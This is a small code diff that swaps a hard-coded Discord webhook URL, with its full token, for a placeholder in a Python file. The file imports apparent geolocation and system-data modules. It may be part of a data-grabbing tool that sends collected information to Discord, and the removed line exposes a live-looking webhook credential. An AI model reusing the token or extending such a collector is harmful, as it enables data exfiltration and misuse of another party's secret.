@@ -2,7 +2,7 @@ import requests
 import zipfile
 import os
 
-webhook_url = 'https://discord.com/api/webhooks/1069971959179395082/OaX8LVPgy2U1c240ow7XeoqCJuGDdWXRhpBpJlr1ZbBCBO7XiLbI_kQhdYf6LHERu9QT'
+webhook_url = 'webhook'
 
 from Source_Data.Geolocation import *
 from Source_Data.System import *
